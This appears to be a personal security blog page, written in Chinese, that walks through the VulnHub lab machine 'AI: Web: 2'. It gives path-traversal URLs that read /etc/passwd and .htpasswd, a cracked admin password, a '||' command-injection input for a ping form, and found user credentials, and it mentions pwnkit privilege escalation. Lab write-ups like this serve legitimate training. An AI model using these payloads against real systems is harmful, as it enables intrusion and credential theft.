@@ -1,0 +1,396 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Easy-AI_Web_2 | X1NRI</title>
+  <meta name="author" content="X1NRI">
+  
+  <meta name="description" content="靶机地址：AI: Web: 2 ~ VulnHub
+
+环境搭建
+入侵
+是个登录界面可以注册进去XuezhuLi FileSharing？搜索一下有目录遍历
+/vul_test/FileSharing/download.php?file_name=../../../../../../../../../../../../../etc/passwd
+
+
+这边扫下目录，正好扫到一个download.php，直接利用
+http://192.168.50.139/download.php?file_name=../../../../../../../../../../../../../etc/passwd
+成功触发"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Easy-AI_Web_2"/>
+  <meta property="og:site_name" content="X1NRI"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="X1NRI" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">X1NRI</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/links" title="Subscribe me.">
+			  <i class="fa fa-chain"></i>Links
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Easy-AI_Web_2</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/ai-web-2,357/">AI: Web: 2 ~ VulnHub</a></p>
+</blockquote>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><img src="/Rxi134_FILE/9c5e37455a54f557b07e1321cb8da7a3_MD5.jpeg"></p>
+<h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p><img src="/Rxi134_FILE/945949733b182b78582a5e5d68a3f829_MD5.jpeg"></p>
+<p>是个登录界面<br><img src="/Rxi134_FILE/9347ffe79c10443dde93f42085eef40f_MD5.jpeg"><br>可以注册进去<br><img src="/Rxi134_FILE/b3046717c69370c5f1f12ca23806c12e_MD5.jpeg"><br>XuezhuLi FileSharing？搜索一下有目录遍历<br><img src="/Rxi134_FILE/5deba8eebc0a0719dd778dd1d100764c_MD5.jpeg"></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">/vul_test/FileSharing/download.php?file_name=../../../../../../../../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<p>这边扫下目录，正好扫到一个download.php，直接利用</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">http://192.168.50.139/download.php?file_name=../../../../../../../../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/a07934496e60f968e52cd7884bb8d5c5_MD5.jpeg"><br>成功触发</p>
+<p>但是不能读取&#x2F;etc&#x2F;shadow，id_rsa也不行</p>
+<p>扫一下目录，有一个&#x2F;webadmin&#x2F;需要密码<br><img src="/Rxi134_FILE/bec81bac25c350fa5a530054d13bbe3d_MD5.jpeg"></p>
+<p>这个服务器是Apache HTTP Server，允许使用 HTTP 身份验证，密码文件位于<code>/etc/apache2/.htpasswd</code></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">aiweb2admin:$apr1$VXqmVvDD$otU1gx4nwCgsAOA7Wi.aU/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>属于md5，john破解出hash<br><img src="/Rxi134_FILE/7419798ceec3ad0112281f72729c3a5d_MD5.jpeg"></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">aiweb2admin:c.ronaldo <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>登录进入&#x2F;webadmin&#x2F;<br><img src="/Rxi134_FILE/27fbb8a153d352c15422b4c420687aaf_MD5.jpeg"></p>
+<p>放上cookie继续扫，能访问到robots.txt<br><img src="/Rxi134_FILE/f358315b7e90455658ff374606383458_MD5.jpeg"></p>
+<p>访问&#x2F;webadmin&#x2F;H05Tpin9555&#x2F;，实现了ping功能<br><img src="/Rxi134_FILE/a39c6ceff9e50aaf13161385404d1f61_MD5.jpeg"></p>
+<p>尝试命令执行，发现 || 可以绕过<br><img src="/Rxi134_FILE/5295f88ef31eb5b041714694407a4b41_MD5.jpeg"><br>经过尝试，过滤了<code>&amp; ; -</code></p>
+<p>我们处于<code>/var/www/html/webadmin/H05Tpin9555</code>目录下，用户为 www-data</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#/var/www/html/webadmin/H05Tpin9555</span>
+index.php
+style-main.css
+
+<span class="token comment">#/var/www/html/webadmin/S0mextras</span>
+index.html
+
+<span class="token comment">#/var/www/html/webadmin/</span>
+H05Tpin9555
+S0mextras
+index.html
+robots.txt
+
+<span class="token comment">#/var/www/html/</span>
+css
+deleting.php
+download.php
+index.php
+logout.php
+signup.php
+srv
+userpage.php
+viewing.php
+webadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>并没有什么可用的</p>
+<p>卡住了，查看wp，有隐藏文件，但是<code>-</code>被过滤了不能使用 ls -a</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1 <span class="token operator">||</span> <span class="token function">ls</span> <span class="token punctuation">..</span>/S0mextras/.*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这样就可以看到隐藏文件了<br><img src="/Rxi134_FILE/cd36ef267539b9b3147784a9fe5f1760_MD5.jpeg"></p>
+<p>这是其中一个用户的账密<br><img src="/Rxi134_FILE/f5a521171b4a7f2fe287b9d4021a4eef_MD5.jpeg"></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">User: n0nr00tuser
+Cred: zxowieoi4sdsadpEClDws1sf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/6e56723323db67af7d4463aad8e44647_MD5.jpeg"></p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>先反弹到meterpreter吧</p>
+<p>没找到好用的，frp转发下端口，ubuntu18 直接pwnkit一把嗦<br><img src="/Rxi134_FILE/d7c0404ee4304956624af50b1b47c0e8_MD5.jpeg"><br><img src="/Rxi134_FILE/fa8ba88e130e5ac0efd4dcc1b02ea409_MD5.jpeg"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过该靶机，我学习到了</p>
+<ul>
+<li>更加深入的理解了msf</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2024/06/06/Easy-AI_Web_2/" class="leancloud-visitors view" data-flag-title="Easy-AI_Web_2">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2024/06/21/CISCN2024华中赛区选拔赛/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/06/05/Easy-AI_Web_1/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-06-06 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>4</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/靶场/">靶场<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-article-text">环境搭建</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%85%A5%E4%BE%B5"><span class="toc-article-text">入侵</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-article-text">权限提升</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-article-text">总结</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 X1NRI's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
